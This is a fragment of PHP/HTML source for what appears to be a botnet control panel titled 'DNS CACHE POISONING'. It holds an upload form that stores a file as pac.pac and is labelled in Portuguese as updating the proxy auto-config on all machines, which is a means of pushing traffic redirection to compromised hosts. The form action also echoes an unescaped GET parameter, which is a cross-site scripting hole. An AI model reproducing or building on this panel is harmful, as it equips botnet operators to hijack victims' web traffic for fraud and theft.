...
<meta charset="UTF-8">
<title>Cyb3rPuNk B0tN3T :: DNS CACHE POISONING </title>
...
if(isset($_FILES['userfile']['name'])){
	$upDir = getcwd() . "/modulos/dnsmanager/midia/";
	$uploadfile = $upDir . "pac.pac";
...
<img src="media/logo.png">
 ...
 <br>
<center>
<form  enctype="multipart/form-data" name="fmrx" method="post" action="dnsmanager.php?IDX=<?php echo $_GET["IDX"]; ?>">
<table width="40%" cellpadding='2' border='0'>
<tr><td colspan="2" align="center"><font style="color: black;"><b>CYBER DNS CACHE POISONING</b></font></td></tr>

<tr><td align="left" valign="center"><font style="color: black;"><b>&nbsp;</b></font></td></tr>
<tr><td align="left" valign="center"><font style="color: black;"><b>Atualizar PAC em todas as m&aacute;quinas</b></font></td></tr>

<tr><td align="left" valign="center" ><input type="file" size="40" id="userfile" name="userfile">
<input type="hidden" name="idxx" value="0"></td>
<td align="right"><input type="submit" value="OK" style="margin: 0px; height: 26px; line-height: 26px; padding: 0px 10px; cursor: pointer; color: rgb(255, 255, 255); font-size: 12px; font-weight: bold; background: none repeat scroll 0% 0% rgb(241, 90, 35); border: medium none; box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.1) inset; border-radius: 2px 2px 2px 2px; transition: all 0.3s ease-in-out 0s;" onclick="javascript: formSubmit();"></td></tr>
</table><br></form>
